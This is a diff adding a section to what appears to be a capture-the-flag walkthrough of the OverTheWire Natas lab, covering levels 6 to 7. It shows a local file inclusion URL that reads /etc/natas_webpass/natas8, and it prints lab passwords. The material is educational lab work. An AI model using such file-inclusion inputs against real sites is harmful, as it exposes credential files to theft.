@@ -85,3 +85,20 @@ there is the secret in it's source code
 ![image](https://github.com/user-attachments/assets/46c79cfa-cb70-4ae0-86c3-5ce51ec93039)
 
 password `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`
+
+## Natas 6-7
+after looking at the hint at the page source
+
+![image](https://github.com/user-attachments/assets/f2e64cb2-3cbd-44c9-a8e3-b5514bb3e036)
+
+LFI is present without any sanitization
+
+http://natas7.natas.labs.overthewire.org/index.php?page=about
+
+so if we do `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
+
+![image](https://github.com/user-attachments/assets/64a5addf-0b37-41f8-8b9e-158e0c9a50a9)
+
+password `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
+
+## Natas 7-8
